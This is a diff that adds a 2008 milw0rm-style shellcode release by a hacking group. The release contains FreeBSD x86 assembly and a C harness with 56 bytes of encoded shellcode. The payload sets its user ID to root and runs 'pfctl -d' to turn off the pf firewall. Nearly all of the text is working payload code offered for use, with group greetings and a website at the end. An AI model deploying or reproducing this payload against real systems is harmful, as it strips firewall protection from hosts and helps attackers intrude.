@@ -1,0 +1,71 @@
+                   ***(C)oDed bY suN8Hclf***
+               DaRk-CodeRs Group production, kid
+     [FreeBSD x86 setreuid(0, 0) + execve(pfctl -d) 56 bytes]
+
+The simples way to disable the FreeBSD's packet filter. We do not
+flush all rules (pfctl -F all) but only turn the firewall off.
+
+Assembly code:
+-------------------------code.asm--------------------------
+section .text
+global _start
+
+_start:
+
+	xor eax, eax
+	push eax
+	push eax
+	mov al, 126
+	push eax
+	int 0x80           ; setreuid()
+
+	xor eax, eax
+	push eax
+	push word 0x642d
+	mov ecx, esp       ; ecx contains a pointer to "-d" string
+
+	push eax 
+	push 0x6c746366
+	push 0x702f6e69
+	push 0x62732f2f
+	mov ebx, esp       ; ebx contains a pointer to "//sbin/pfctl" string
+
+	push eax
+	push ecx
+	push ebx
+	mov ecx, esp
+
+	push eax
+	push ecx
+	push ebx
+	mov al, 0x3b
+	push eax
+	int 0x80          ; execve()
+
+	xor eax, eax
+	push eax
+	push eax
+	int 0x80          ; exit()
+-------------------------code.asm--------------------------
+And C code:
+-------------------------code.c----------------------------
+#include <stdio.h>
+
+char shellcode[]=
+"\x31\xc0\x50\x50\xb0\x7e\x50\xcd\x80\x31\xc0\x50\x66\x68\x2d\x64" 
+"\x89\xe1\x50\x68\x66\x63\x74\x6c\x68\x69\x6e\x2f\x70\x68\x2f\x2f"
+"\x73\x62\x89\xe3\x50\x51\x53\x89\xe1\x50\x51\x53\xb0\x3b\x50\xcd"
+"\x80\x31\xc0\x50\x50\xcd\x80";
+
+int main(int argc, char *argv[]){
+	int (*func)();
+	func=(int (*)())shellcode;
+	(int)(*func)();
+}
+-------------------------code.c----------------------------
+
+Greetz to: 0in, cOndemned (and to other DaRk-CodeRs members), str0ke, e.wiZz!, 
+           Katharsis, doctor and many others...
+Visit us : www.dark-coders.pl
+
+# milw0rm.com [2008-09-12]
